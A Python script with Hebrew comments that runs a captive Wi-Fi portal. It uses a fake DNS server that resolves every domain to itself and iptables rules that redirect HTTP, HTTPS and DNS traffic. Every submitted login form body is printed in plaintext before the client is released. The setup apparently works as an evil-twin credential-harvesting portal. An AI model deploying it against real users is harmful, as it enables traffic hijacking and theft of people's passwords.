from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import os
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A
import threading
import socket
import psutil  # pip install psutil

# הגדרות כלליות
BIND_IP = "192.168.1.1"
PORT = 80
DNS_PORT = 53
INTERFACE = "wlp4s0f4u1"
INTERNET_IFACE = "wlp2s0"
CAPTIVE_IP = BIND_IP
PID_FILE = "/tmp/captive_http_server.pid"

authenticated_ips = set()

# Captive DNS Resolver
class FakeResolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(CAPTIVE_IP), ttl=60))
        return reply

def start_dns_server():
    resolver = FakeResolver()
    server = DNSServer(resolver, port=DNS_PORT, address=BIND_IP)
    print("[*] Fake DNS server started on port 53...")
    server.start()

def kill_previous_http_server():
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE, 'r') as f:
                pid = int(f.read().strip())
            print(f"[!] Killing previous http_server.py with PID {pid}")
            subprocess.run(["sudo", "kill", "-9", str(pid)], check=True)
            os.remove(PID_FILE)
        except Exception as e:
            print(f"[!] Failed to kill previous process: {e}")

def kill_process_on_port(ip, port):
    for conn in psutil.net_connections(kind='inet'):
        if conn.laddr.ip == ip and conn.laddr.port == port and conn.status == psutil.CONN_LISTEN:
            pid = conn.pid
            if pid:
                print(f"[!] Port {port} already in use by PID {pid}, killing...")
                try:
                    p = psutil.Process(pid)
                    p.kill()
                    p.wait(timeout=3)
                    print(f"[+] Killed process {pid} that was using {ip}:{port}")
                except Exception as e:
                    print(f"[!] Failed to kill process {pid}: {e}")
            return

def configure_iptables():
    print("[*] Configuring iptables for captive portal redirection...")

    # הפניית HTTP
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", INTERFACE,
                    "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", f"{BIND_IP}:80"], check=True)

    # הפניית HTTPS
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", INTERFACE,
                    "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "80"], check=True)

    # הפניית DNS
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", INTERFACE,
                    "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", f"{BIND_IP}:53"], check=True)

    # חסימת פורוורד כללי
    subprocess.run(["iptables", "-A", "FORWARD", "-i", INTERFACE, "-o", INTERNET_IFACE, "-j", "DROP"], check=True)

def unblock_ip(ip):
    subprocess.run(["iptables", "-I", "FORWARD", "-s", ip, "-o", INTERNET_IFACE, "-j", "ACCEPT"], check=True)
    print(f"[+] Unblocked IP: {ip}")
    authenticated_ips.add(ip)

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        ip = self.client_address[0]

        # אם ה-IP שלה לא אומת - הצג את index.html
        if ip not in authenticated_ips:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())
            return

        if any(x in self.path for x in ["/generate_204", "/hotspot-detect.html", "/ncsi.txt"]):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><script>location.href='/'</script></body></html>")
            return

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        with open("index.html", "rb") as f:
            self.wfile.write(f.read())

    def do_POST(self):
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_len).decode()
        ip = self.client_address[0]
        print(f"[+] Login received from {ip}: {body}")
        unblock_ip(ip)
        self.send_response(302)
        self.send_header("Location", "http://example.com")
        self.end_headers()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run this script as root.")
        exit(1)

    kill_previous_http_server()
    kill_process_on_port(BIND_IP, PORT)

    with open(PID_FILE, 'w') as f:
        f.write(str(os.getpid()))

    threading.Thread(target=start_dns_server, daemon=True).start()
    configure_iptables()
    print(f"[*] Captive Portal HTTP server running on http://{BIND_IP}:{PORT}")
    HTTPServer((BIND_IP, PORT), CaptivePortalHandler).serve_forever()
